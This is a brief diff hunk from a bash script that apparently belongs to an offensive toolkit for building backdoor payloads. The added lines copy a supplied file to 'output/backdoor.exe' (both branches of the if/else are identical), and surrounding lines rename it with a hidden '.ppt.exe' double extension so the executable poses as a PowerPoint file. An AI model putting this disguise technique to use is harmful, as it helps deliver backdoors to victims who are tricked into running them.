@@ -222,6 +222,12 @@ cat << !
 
     # insert .ppt hidden extension
     echo ${BlueF}[☆]${white} Adding agent hidden extensions '->' ${GreenF}done... ${Reset};
+    if [ "$ByPa" = "NO" ]; then
+      cp $UpL  $IPATH/output/backdoor.exe > /dev/null 2>&1
+    else
+      cp $UpL  $IPATH/output/backdoor.exe > /dev/null 2>&1
+    fi
+
     if [ "$tRan" = "YES" ]; then
       mv $IPATH/output/backdoor.exe  $IPATH/output/$MiP.ppt.exe > /dev/null 2>&1
     else
